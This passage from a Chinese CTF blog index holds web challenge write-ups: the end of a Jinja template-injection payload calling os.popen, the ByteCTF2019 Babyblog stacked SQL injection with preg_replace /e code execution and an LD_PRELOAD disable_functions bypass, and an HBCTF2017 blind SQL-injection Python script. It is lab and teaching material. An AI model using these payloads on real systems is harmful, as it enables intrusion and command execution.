<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="string">"\x5f\x5fmro\x5f\x5f"</span>][<span class="number">1</span>][<span class="string">"\x5f\x5fsubclasses\x5f\x5f"</span>]()[<span class="number">30</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>来找到warnings.WarningMessage类，再通过__builtins__找到__import__来导入os模块。</p>
<p>最终payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="string">"\x5f\x5fmro\x5f\x5f"</span>][<span class="number">1</span>][<span class="string">"\x5f\x5fsubclasses\x5f\x5f"</span>]()[<span class="number">30</span>][<span class="string">"\x5f\x5finit\x5f\x5f"</span>][<span class="string">"\x5f\x5fglobals\x5f\x5f"</span>][<span class="string">"\x5f\x5fbuiltins\x5f\x5f"</span>][<span class="string">'\x5f\x5fimport\x5f\x5f'</span>](<span class="string">'os'</span>)[<span class="string">"popen"</span>](<span class="string">'cat%20/webapp/start*'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在start.sh里找到flag</p>
<p><img src="/2020/02/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%88%98%E7%96%AB%E8%B5%9Bweb1%E9%A2%98%E8%A7%A3/1.png" alt></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/17/ByteCTF2019%E4%B8%8EHBCTF2017%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/">ByteCTF2019与HBCTF2017两道web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="ByteCTF2019-Babyblog"><a href="#ByteCTF2019-Babyblog" class="headerlink" title="ByteCTF2019 Babyblog"></a>ByteCTF2019 Babyblog</h2><p><a href="http://www.zip下载源码，在edit.php处发现二次注入：" target="_blank" rel="noopener">www.zip下载源码，在edit.php处发现二次注入：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">		$title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">		$content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">		$sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在config.php里可以看到执行sql语句用的是PDO</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=babyblog"</span>, <span class="string">'CTF2019'</span>, <span class="string">'*************'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"SQL Server Down T.T"</span>);</span><br></pre></td></tr></table></figure>

<p>对于PDO模式，控制多句执行的PDO::MYSQL_ATTR_MULTI_STATEMENTS设置项是默认开启的，所以可以利用这个二次注入进行堆叠注入来把我们的账户改为vip账户。由于SafeFilter函数把update过滤掉了，这里可以使用预编译进行绕过。PDO模式下控制预编译的PDO::ATTR_EMULATE_PREPARES设置项也是默认开启的，所以这里先把title设置为<code>&#39;;SeT@x=0x757064617465207573657273207365742069737669703D3120776865726520757365726E616D653D2731323327;prepare a from @x;execute a;#</code>，通过把字符串转换为16进制的方式来绕过过滤。再进行一次编辑就可以触发堆叠注入使得账号变为vip并可以访问replace.php。在replace.php里看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br></pre></td></tr></table></figure>

<p>由于php版本较低，这里可以使用\x00截断以及e修饰符来执行命令。即<code>find=.*/e\x00</code>，<code>replace=phpinfo();</code>。之后通过error_log进行disable_function绕过，利用该项目的脚本与.so文件：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD。只需要简单修改项目里php文件的内容里的mail函数改为error_log即可，最后用perl来获取flag。" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD。只需要简单修改项目里php文件的内容里的mail函数改为error_log即可，最后用perl来获取flag。</a></p>
<h2 id="HBCTF2017-大美西安"><a href="#HBCTF2017-大美西安" class="headerlink" title="HBCTF2017 大美西安"></a>HBCTF2017 大美西安</h2><p>下载文件处存在sql注入，可以用双写绕过关键字过滤，从而读取任意文件</p>
<p><img src="/2020/02/17/ByteCTF2019%E4%B8%8EHBCTF2017%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/1.png" alt="1"></p>
<p>index.php里可以看到文件包含处存在过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file  = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">"home"</span>;</span><br><span class="line"><span class="comment">// echo $file;</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\.|^[\s]*\/|^[\s]*php:|filter/i'</span>,$file))&#123;</span><br><span class="line">	   <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">		&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以想到上传一个zip文件利用phar://协议来包含shell。在upload.php里有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($fileTypeCheck)&#123;</span><br><span class="line">        </span><br><span class="line">        $fileOldName = addslashes(pathinfo($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],PATHINFO_FILENAME));</span><br><span class="line">        $fileNewName = <span class="string">'./Up10aDs/'</span> . random_str() .<span class="string">'.'</span>.pathinfo($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],PATHINFO_EXTENSION);</span><br><span class="line">        $userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line">        $sql= <span class="string">"insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')"</span>;</span><br><span class="line">        $res = $conn -&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($res&amp;&amp;move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $fileNewName))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file upload success!');window.location.href='index.php?file=home'&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file upload error')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file  type error');&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>文件名会被放入数据库中，但文件会被重命名为32位的随机字符串。可以通过以下payload来盲注出文件名 <code>8 anandd location lilikeke 0x2e2f557031306144732f{}25</code>，8是上传的zip文件的序号。贴下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line">url = <span class="string">"http://4fda2094-0c96-407e-a3af-a94cb9026ffe.node3.buuoj.cn/downfile.php"</span></span><br><span class="line">location = <span class="string">"./Up10aDs/hgpf1g3ymgxe44antdi"</span></span><br><span class="line">payload = <span class="string">"8 anandd location lilikeke 0x2e2f557031306144732f&#123;&#125;25"</span></span><br><span class="line">hex_str = <span class="string">""</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"image"</span> : <span class="string">""</span>,</span><br><span class="line">    <span class="string">"image_download"</span>:<span class="string">"%E6%94%B6%E8%97%8F"</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span> : <span class="string">"47tua03gs083tv8roe3ombspq2"</span></span><br><span class="line">&#125;</span><br><span class="line">chars = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        h = hex(ord(j))[<span class="number">2</span>:]</span><br><span class="line">        data[<span class="string">"image"</span>] = payload.format(hex_str + h)</span><br><span class="line">        res = r.post(url,data=data, cookies=cookies)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"picture can't be"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hex_str += h</span><br><span class="line">            location += j</span><br><span class="line">            print(<span class="string">"[+]"</span> + location)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class=&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://images.alphacoders.com/975/975730.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By EVatom</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>